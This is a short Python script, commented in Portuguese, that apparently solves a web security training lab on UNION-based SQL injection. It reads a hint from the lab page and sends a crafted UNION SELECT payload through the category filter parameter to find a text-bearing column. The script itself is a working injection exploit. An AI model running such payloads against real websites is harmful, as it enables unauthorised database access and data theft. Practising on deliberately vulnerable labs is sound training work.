"""
Lab: SQL injection UNION attack, finding a column containing text

Objetivo:
Explorar uma SQL Injection UNION para identificar quais colunas aceitam valores do tipo string.
"""

import requests
from bs4 import BeautifulSoup as bs

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

target_url = input("URL do laboratório: ").rstrip("/")

session = requests.Session()

response = session.get(target_url)

hint = bs(response.text,"html.parser").find("p",{"id":"hint"}).text
hint_string = hint.split("'")[1]

payload = f"' UNION SELECT NULL,'{hint_string}',NULL--"

session.get(
    f"{target_url}/filter",
    params={"category": f"Pets{payload}"}
)

check = session.get(target_url)

if "Congratulations" in check.text:
    print(f"{GREEN}[+] Vulnerabilidade explorada.{RESET}")
else:
    print(f"{RED}[-] Exploração não confirmada.{RESET}")